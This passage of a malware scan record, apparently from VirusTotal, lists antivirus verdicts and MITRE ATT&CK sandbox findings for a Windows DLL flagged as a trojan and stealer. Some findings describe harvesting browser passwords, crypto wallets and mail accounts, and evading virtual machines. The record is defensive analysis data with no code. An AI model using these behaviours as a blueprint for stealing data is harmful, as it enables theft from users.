              "RtlCaptureContext",
              "RtlLookupFunctionEntry",
              "RtlPcToFileHeader",
              "RtlUnwindEx",
              "RtlVirtualUnwind",
              "SetFilePointerEx",
              "SetLastError",
              "SetStdHandle",
              "SetUnhandledExceptionFilter",
              "TerminateProcess",
              "TlsAlloc",
              "TlsFree",
              "TlsGetValue",
              "TlsSetValue",
              "UnhandledExceptionFilter",
              "VirtualAlloc",
              "VirtualFree",
              "WideCharToMultiByte",
              "WriteConsoleW",
              "WriteFile"
            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "MessageBoxW"
            ]
          }
        ]
      },
      "magic": "PE32+ executable (DLL) (console) x86-64, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 5,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 52,
        "undetected": 19
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W64.AIDetectMalware",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.121",
          "result": "malicious (high confidence)",
          "method": "blacklist",
          "engine_update": "20231208"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Gen:Variant.Doina.68024",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Gen:Variant.Doina.68024",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231224"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.Win64.Trojan.vc",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.Spy.Stealer",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20231108"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5020",
          "result": "Trojan.GenKryptik.Win64.11036",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Trojan.Win32.Kryptik.Vaga",
          "method": "blacklist",
          "engine_update": "20231219"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20231026"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "Trojan:Win32/Khalesi.2b7c0c1a",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.131.50520",
          "result": "Trojan ( 005a18631 )",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.131.50519",
          "result": "Trojan ( 005a18631 )",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Doina.D109B8",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231127"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.605",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231222"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Trojan Horse",
          "method": "blacklist",
          "engine_update": "20231224"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28458",
          "result": "a variant of Win64/GenKryptik.GHBZ",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.482",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "Trojan.Win32.Khalesi.nrbx",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Gen:Variant.Doina.68024",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Win64:CrypterX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Malware.Win32.Gencirc.11b9e363",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-12-25.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Mal/Generic-S",
          "method": "blacklist",
          "engine_update": "20231224"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Trojan.TR/Crypt.Agent.byxpi",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Gen:Variant.Doina.68024",
          "method": "blacklist",
          "engine_update": "20231224"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_GEN.R002C0XKD23",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Trapmine": {
          "category": "malicious",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "result": "malicious.moderate.ml.score",
          "method": "blacklist",
          "engine_update": "20231106"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Gen:Variant.Doina.68024 (B)",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "SentinelOne": {
          "category": "malicious",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": "Static AI - Suspicious PE",
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231225-02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Trojan.Khalesi.bimm",
          "method": "blacklist",
          "engine_update": "20231224"
        },
        "Webroot": {
          "category": "undetected",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "W64/Kryptik.LCSH-1498",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "TR/Crypt.Agent.byxpi",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/Win64.GenKryptik",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "Win32.Trojan.Khalesi.nrbx",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "malicious",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.152.174",
          "result": "Trojan.Heur!.02012022",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36287",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "Trojan:Win32/Wacatac.B!ml",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "Trojan.Win.Z.Midie.6808576",
          "method": "blacklist",
          "engine_update": "20231224"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Trojan.Win32.Khalesi.nrbx",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37039B:27.34323",
          "result": "Gen:Variant.Doina.68024",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1703496637",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231121"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Trojan/Win.Generic.C5534233",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Artemis!174FF2E9B7A6",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=81)",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231222"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "Trojan.Dropper",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/Chgt.AD",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_GEN.R002C0XKD23",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Spyware.BlueFox!8.16E44 (TFE:5:jVUWCPQQRK)",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.Win64.Krypt",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.221580232.susgen",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "W32/GenKryptik.GHBZ!tr",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Win64:CrypterX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20231224"
        }
      },
      "reputation": 0,
      "sigma_analysis_stats": {
        "high": 0,
        "medium": 0,
        "critical": 0,
        "low": 1
      }
    },
    "type": "file",
    "id": "30fda67726f77706955f6b52b202452e91d5ff132783854eec63e809061a4b5c",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/30fda67726f77706955f6b52b202452e91d5ff132783854eec63e809061a4b5c"
    }
  },
  "mitre": {
    "data": {
      "CAPE Sandbox": {
        "tactics": [
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may attempt to get information about running processes on a system."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/001/",
                "id": "T1071.001",
                "name": "Web Protocols"
              },
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/",
                "id": "T1564",
                "name": "Hide Artifacts"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/001/",
                "id": "T1564.001",
                "name": "Hidden Files and Directories"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      },
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              },
              {
                "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Tries to search for mail accounts"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1114/",
                "id": "T1114",
                "name": "Email Collection"
              },
              {
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Found many strings related to Crypto-Wallets (likely being stolen)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to harvest and steal browser information (history, passwords, etc)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1005/",
                "id": "T1005",
                "name": "Data from Local System"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Enumerates the file system"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries a list of all running processes"
                  },
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Contains capabilities to detect virtual machines"
                  },
                  {
                    "severity": "INFO",
                    "description": "May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
